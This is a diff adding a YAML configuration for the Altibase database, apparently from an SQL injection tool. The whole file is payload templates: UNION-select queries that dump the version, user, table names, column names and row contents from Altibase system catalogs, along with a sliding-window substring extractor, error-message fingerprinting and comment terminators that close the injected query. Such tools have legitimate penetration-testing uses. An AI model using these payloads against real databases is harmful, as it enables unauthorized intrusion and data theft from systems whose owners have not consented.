@@ -1,0 +1,126 @@
+vendor: Altibase
+
+resource: 
+ info: |
+   'altibase_version'
+   || '${enclose_value_sql}'
+   || 'altibase_database'
+   || '${enclose_value_sql}'
+   || USER_NAME()
+   || '${trail_sql}'
+
+ schema:
+  database: |
+   select
+       '${enclose_value_sql}'
+       || 'SYSTEM_'
+       || '${separator_qte_sql}'
+       || 0
+       || '${enclose_value_sql}'
+       || '${trail_sql}'
+   ${limit}
+
+  table: |
+   select
+       group_concat(
+           r,
+           '${separator_cell_sql}'
+       )
+       || '${trail_sql}'
+   from (
+       select
+           '${enclose_value_sql}'
+           || TABLE_NAME
+           || '${separator_qte_sql}'
+           || 0
+           || '${enclose_value_sql}'
+           r
+       from SYSTEM_.SYS_TABLES_
+       order by r
+       ${limit}
+   ) x
+
+  column: |
+   select
+       group_concat(
+           n,
+           '${separator_cell_sql}'
+       )
+       || '${trail_sql}'
+   from (
+       select
+           '${enclose_value_sql}'
+           || COLUMN_NAME
+           || '${separator_qte_sql}'
+           || 0
+           || '${enclose_value_sql}'
+           n
+       from SYSTEM_.SYS_COLUMNS_ c
+       inner join SYSTEM_.SYS_TABLES_ t
+       on c.table_id = t.table_id
+       where TABLE_NAME = '${table}'
+       order by n
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select
+        group_concat(
+            r,
+            '${separator_cell_sql}'
+        )
+        || '${trail_sql}'
+    from (
+        select distinct
+            '${enclose_value_sql}'
+            || ${fields}
+            || '${separator_qte_sql}'
+            || 0
+            || '${enclose_value_sql}'
+            r
+        from ${database}.${table}
+        order by r
+        ${limit}
+    ) x
+   fields:
+    field: ${field.value}
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           concat(
+               '${lead}',
+               substr(
+                   (${injection}),
+                   ${window.char},
+                   ${capacity}
+               )
+           )
+   )
+  limit: limit ${limit.value}, 65536
+  failsafe: "''||1337${indice}7330%2b1"
+  calibrator: replicate('${calibrator_sql}', 4000)
+  limitBoundary: 1
+  endingComment: --+
+  fingerprint:
+   errorMessage:
+    - Altibase
+
+ normal:
+  indices: union select ${indices}
+  capacity: |
+   (
+       select
+           '${lead}'
+           || ${indice}
+           || ${calibrator}
+   )
+  orderBy: order by 1337
+
+ # boolean:
+ # BITAND( BIT'11111111', BIT'10101010' ) requires type bit
+ # impossible to convert ascii('a') to bit
